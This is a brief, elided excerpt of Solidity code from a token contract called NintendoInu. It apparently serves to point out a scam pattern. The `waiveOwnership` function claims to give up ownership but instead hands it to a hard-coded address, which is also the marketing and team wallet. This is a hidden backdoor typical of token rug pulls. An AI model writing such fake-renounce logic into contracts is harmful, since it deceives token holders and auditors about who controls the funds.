...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xEebE7380De53d1fFC85C46326484B101138354D1);
    }
...
contract NintendoInu is Context, IERC20, Ownable {
    ...
    address payable private marketingWalletAddress = payable(0xEebE7380De53d1fFC85C46326484B101138354D1);
    address payable private teamWalletAddress = payable(0xEebE7380De53d1fFC85C46326484B101138354D1);
